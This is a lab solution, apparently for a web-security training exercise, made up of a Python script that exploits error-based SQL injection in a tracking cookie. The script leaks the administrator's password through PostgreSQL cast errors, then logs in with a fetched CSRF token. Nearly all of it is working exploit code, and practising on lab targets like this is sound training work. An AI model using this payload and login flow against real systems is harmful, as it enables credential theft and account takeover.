# Visible error-based SQL injection
> This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
   The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Visible error-based SQL injection
# GOAL: Extract password via verbose SQL error messages
TARGET_URL = "https://0aff005203212376804d4e8c00a100d4.web-security-academy.net/"

def get_session(url):
    """
    Establishes the initial session.
    """
    session = requests.Session()
    response = session.get(url)
    if "TrackingId" in session.cookies:
        print("[+] Session established.")
        return session
    else:
        print("[-] Failed to get TrackingId.")
        sys.exit(1)

def get_password(url, session):
    """
    Exploits verbose error messages to leak the password.
    Method: 'Cast to Integer' (PostgreSQL).
    """
    print("[*] Triggering verbose SQL error...")
    
    # Payload logic:
    # 1. Start with ' to break the string.
    # 2. Use CAST(... AS INT) to force a type conversion error.
    # 3. The DB will fail to convert the password string to an INT and print the string in the error.
    # 4. We remove the original TrackingId value to fit the payload within character limits.
    payload = "' AND CAST((SELECT password FROM users LIMIT 1) AS INT)=1 --"
    
    # We replace the cookie value entirely with our payload
    response = session.get(url, cookies={"TrackingId": payload})
    
    soup = BeautifulSoup(response.text, "html.parser")
    
    # Look for the error message in the HTML
    # Example format: "ERROR: invalid input syntax for type integer: "s3cr3t""
    error_tag = soup.find(lambda t: t.name == 'p' and "ERROR" in t.text)
    
    if error_tag:
        error_message = error_tag.text
        # Logic: Split by colon to isolate the value part
        # 'ERROR' [0] : ' invalid input...' [1] : ' "password"' [2]
        password = error_message.split(":")[2].strip('" ')
        
        print(f"[+] Password Leaked: {password}")
        return password
    else:
        print("[-] Error message not found in response.")
        sys.exit(1)

def login(url, password):
    """
    Standard login function to verify the exploit.
    """
    login_url = url + "login"
    print(f"[-] Logging in to {login_url}...")
    
    # Use a fresh session for login to be clean
    s = requests.Session()
    
    # 1. Get CSRF Token
    response = s.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find("input", {"name": "csrf"})
    
    if not token_input:
        print("[-] CSRF token not found.")
        return

    token = token_input['value']
    
    login_data = {
        "username": "administrator",
        "password": password,
        "csrf": token
    }
    
    # 2. Post Credentials
    response = s.post(login_url, data=login_data)
    
    # strict check: Look for "Log out" button, not just status 200
    if "Log out" in response.text:
        print("[SUCCESS] LOGGED IN AS ADMINISTRATOR!")
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    session = get_session(TARGET_URL)
    password = get_password(TARGET_URL, session)
    
    if password:
        login(TARGET_URL, password)
```